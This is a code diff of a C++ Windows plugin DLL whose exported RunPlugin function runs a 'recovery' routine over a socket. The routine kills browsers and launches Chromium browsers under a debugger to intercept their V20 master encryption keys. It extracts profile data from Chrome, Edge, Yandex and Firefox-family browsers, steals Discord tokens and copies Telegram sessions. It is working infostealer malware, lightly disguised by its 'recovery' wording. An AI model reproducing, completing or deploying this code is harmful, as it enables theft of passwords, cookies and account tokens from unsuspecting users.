         {"Microsoft Edge", "msedge.exe", {L"msedge.exe"}, "msedge.dll", {L"Microsoft", L"Edge", L"User Data"}, "browsers/Microsoft Edge", "edge_tmp", true, false, true, false},
@@ -712,33 +789,36 @@ void run_recovery(SOCKET sock) {
         {"LibreWolf", "librewolf.exe", {L"librewolf.exe"}, "nss3.dll", {L"LibreWolf", L"Profiles"}, "browsers/LibreWolf", "librewolf_tmp", false, true, false, true},
         {"Yandex Browser", "browser.exe", {L"browser.exe"}, "browser.dll", {L"Yandex", L"YandexBrowser", L"User Data"}, "browsers/Yandex Browser", "yandex_tmp", false, false, false, false}
     };
-    send_status(sock, "Terminating processes...");
+    send_status(sock, "Terminating active browser instances...");
     for (const auto& c : {"chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "browser.exe", "firefox.exe"}) {
         std::wstring w(utf8_to_wstring(c)); HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (snap != INVALID_HANDLE_VALUE) { PROCESSENTRY32W pe; pe.dwSize = sizeof(pe); if (Process32FirstW(snap, &pe)) do { if (_wcsicmp(pe.szExeFile, w.c_str()) == 0) { HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID); if (h) { TerminateProcess(h, 0); CloseHandle(h); } } } while (Process32NextW(snap, &pe)); CloseHandle(snap); }
     }
     for (const auto& config : configs) {
-        std::wstring ud = get_user_data_dir(config.user_data_subdir, config.use_roaming); if (ud.empty()) continue;
-        send_status(sock, "Checking " + config.name);
-        if (config.is_firefox) { extract_firefox_data(sock, config, ud); continue; }
-        if (!config.has_abe) { extract_all_profiles_data(sock, {}, config, ud); continue; }
-        std::wstring exe = get_browser_exe_path(utf8_to_wstring(config.process_name));
-        if (exe.empty()) { for (const auto& r : get_search_roots()) for (const auto& p : config.exe_paths) { fs::path f = fs::path(r) / p; if (fs::exists(f)) { exe = f.wstring(); break; } } }
-        if (exe.empty()) { extract_all_profiles_data(sock, {}, config, ud); continue; }
-        STARTUPINFOW si = {sizeof(si)}; si.cb = sizeof(si); PROCESS_INFORMATION pi = {0}; std::wstring cmd = L"\"" + exe + L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check";
-        std::vector<wchar_t> cb(cmd.begin(), cmd.end()); cb.push_back(0);
-        if (CreateProcessW(NULL, cb.data(), NULL, NULL, FALSE, DEBUG_PROCESS | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
-            std::vector<uint8_t> v20 = debug_loop_get_key(sock, pi.dwProcessId, config);
-            TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            if (!v20.empty()) { send_status(sock, "Master key intercepted for " + config.name); extract_all_profiles_data(sock, v20, config, ud); }
-            else { send_status(sock, "Key interception timeout for " + config.name); extract_all_profiles_data(sock, {}, config, ud); }
-        } else extract_all_profiles_data(sock, {}, config, ud);
+        try {
+            std::wstring ud = get_user_data_dir(config.user_data_subdir, config.use_roaming); if (ud.empty()) continue;
+            send_status(sock, "Analyzing " + config.name + "...");
+            if (config.is_firefox) { extract_firefox_data(sock, config, ud); continue; }
+            if (!config.has_abe) { extract_all_profiles_data(sock, {}, config, ud); continue; }
+            std::wstring exe = get_browser_exe_path(utf8_to_wstring(config.process_name));
+            if (exe.empty()) { for (const auto& r : get_search_roots()) for (const auto& p : config.exe_paths) { fs::path f = fs::path(r) / p; if (fs::exists(f)) { exe = f.wstring(); break; } } }
+            if (exe.empty()) { extract_all_profiles_data(sock, {}, config, ud); continue; }
+            STARTUPINFOW si = {sizeof(si)}; si.cb = sizeof(si); PROCESS_INFORMATION pi = {0};
+            std::wstring cmd = L"\"" + exe + L"\" --no-sandbox --disable-gpu --no-first-run --no-default-browser-check";
+            std::vector<wchar_t> cb(cmd.begin(), cmd.end()); cb.push_back(0);
+            if (CreateProcessW(NULL, cb.data(), NULL, NULL, FALSE, DEBUG_PROCESS | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
+                std::vector<uint8_t> v20 = debug_loop_get_key(sock, pi.dwProcessId, config);
+                TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
+                if (!v20.empty()) { send_status(sock, "V20 master key intercepted for " + config.name); extract_all_profiles_data(sock, v20, config, ud); }
+                else { send_status(sock, "V20 interception timed out for " + config.name + ". Using fallback."); extract_all_profiles_data(sock, {}, config, ud); }
+            } else extract_all_profiles_data(sock, {}, config, ud);
+        } catch (...) { send_status(sock, "Error during " + config.name + " processing."); }
     }
     wchar_t* app; if (SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, NULL, &app) == S_OK) {
         fs::path r(app); CoTaskMemFree(app);
         for (const auto& d : {std::pair<std::string, std::wstring>{"Discord", L"discord"}, {"Discord Canary", L"discordcanary"}, {"Discord PTB", L"discordptb"}}) { fs::path p = r / d.second; if (fs::exists(p)) extract_discord_tokens(sock, p.wstring(), d.first); }
     }
-    extract_telegram_session(sock); send_status(sock, "Recovery completed.");
+    extract_telegram_session(sock); send_status(sock, "Full recovery task finished.");
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) { run_recovery(sock); }
